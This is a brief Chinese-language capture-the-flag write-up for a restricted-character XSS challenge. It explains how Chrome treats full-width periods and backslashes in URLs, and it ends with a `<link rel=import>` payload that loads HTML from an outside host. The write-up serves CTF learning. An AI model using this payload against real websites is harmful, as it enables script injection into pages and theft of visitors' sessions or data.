## simpleXSS

XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符号，那么大概只有两种方案：
1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作
2. 利用某些奇怪的HTML标签特性


比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队https://ctftime.org/writeup/5956 脑洞出来了个奇葩思路，只能佩服下RMB玩家...不对，应该是$12.95 Dollar玩家orz


我们（nao）想（dong）出来的payload有如下几个关键点：
1. Chrome会把域名中的`。`（全角句号）理解成`.`
2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行
3. `\\`会被Chrome理解成`//`，`\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\`理解成windows资源管理器里敲的那种`\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\example。com\xssHtml`会变成`//example.com/xssHtml`


综上，payload:
```html
<link rel=import href=\\example。com\xssHtml other= 
```
